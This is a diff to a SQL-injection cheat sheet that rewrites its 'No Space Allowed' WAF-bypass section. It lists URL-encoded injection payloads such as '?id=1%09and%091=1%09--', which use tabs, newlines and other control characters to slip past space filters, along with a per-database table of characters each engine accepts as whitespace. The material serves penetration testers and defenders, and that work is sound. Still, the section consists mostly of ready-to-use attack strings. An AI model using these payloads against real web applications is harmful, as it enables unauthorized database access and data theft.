@@ -31,7 +31,7 @@
 * [Second Order SQL Injection](#second-order-sql-injection)
 * [PDO Prepared Statements](#pdo-prepared-statements)
 * [Generic WAF Bypass](#generic-waf-bypass)
-    * [White Spaces](#white-spaces)
+    * [No Space Allowed](#no-space-allowed)
     * [No Comma Allowed](#no-comma-allowed)
     * [No Equal Allowed](#no-equal-allowed)
     * [Case Modification](#case-modification)
@@ -439,30 +439,37 @@ PDO allows for binding of input parameters, which ensures that user data is prop
 
 ## Generic WAF Bypass
 
-### White Spaces
+### No Space Allowed
 
-Bypass using whitespace alternatives.
+Some web applications attempt to secure their SQL queries by blocking or stripping space characters to prevent simple SQL injection attacks. However, attackers can bypass these filters by using alternative whitespace characters, comments, or creative use of parentheses.
 
-| Bypass                   | Technique              |
-| ------------------------ | ---------------------- |
-| `?id=1%09and%091=1%09--` | Whitespace alternative |
-| `?id=1%0Aand%0A1=1%0A--` | Whitespace alternative |
-| `?id=1%0Band%0B1=1%0B--` | Whitespace alternative |
-| `?id=1%0Cand%0C1=1%0C--` | Whitespace alternative |
-| `?id=1%0Dand%0D1=1%0D--` | Whitespace alternative |
-| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
-| `?id=1%A0and%A01=1%A0--` | Whitespace alternative |
+#### Alternative Whitespace Characters
 
-| DBMS       | ASCII characters in hexadecimal |
-| ---------- | ------------------------------- |
-| SQLite3    | 0A, 0D, 0C, 09, 20 |
-| MySQL 5    | 09, 0A, 0B, 0C, 0D, A0, 20 |
-| MySQL 3    | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0 |
-| PostgreSQL | 0A, 0D, 0C, 09, 20 |
-| Oracle 11g | 00, 0A, 0D, 0C, 09, 20 |
-| MSSQL      | 01, 02, 03, 04, 05, 06, 07, 08, 09, 0A, 0B, 0C, 0D, 0E, 0F, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 1A, 1B, 1C, 1D, 1E, 1F, 20 |
+Most databases interpret certain ASCII control characters and encoded spaces (such as tabs, newlines, etc.) as whitespace in SQL statements. By encoding these characters, attackers can often evade space-based filters.
 
-Bypass using comments and parenthesis.
+| Example Payload               | Description                      |
+|-------------------------------|----------------------------------|
+| `?id=1%09and%091=1%09--`      | `%09` is tab (`\t`)              |
+| `?id=1%0Aand%0A1=1%0A--`      | `%0A` is line feed (`\n`)        |
+| `?id=1%0Band%0B1=1%0B--`      | `%0B` is vertical tab            |
+| `?id=1%0Cand%0C1=1%0C--`      | `%0C` is form feed               |
+| `?id=1%0Dand%0D1=1%0D--`      | `%0D` is carriage return (`\r`)  |
+| `?id=1%A0and%A01=1%A0--`      | `%A0` is non-breaking space      |
+
+**ASCII Whitespace Support by Database**:
+
+| DBMS         | Supported Whitespace Characters (Hex)            |
+|--------------|----------------------------------------------___-|
+| SQLite3      | 0A, 0D, 0C, 09, 20                               |
+| MySQL 5      | 09, 0A, 0B, 0C, 0D, A0, 20                       |
+| MySQL 3      | 01–1F, 20, 7F, 80, 81, 88, 8D, 8F, 90, 98, 9D, A0|
+| PostgreSQL   | 0A, 0D, 0C, 09, 20                               |
+| Oracle 11g   | 00, 0A, 0D, 0C, 09, 20                           |
+| MSSQL        | 01–1F, 20                                        |
+
+#### Bypassing with Comments and Parentheses
+
+SQL allows comments and grouping, which can break up keywords and queries, thus defeating space filters:
 
 | Bypass                                    | Technique            |
 | ----------------------------------------- | -------------------- |
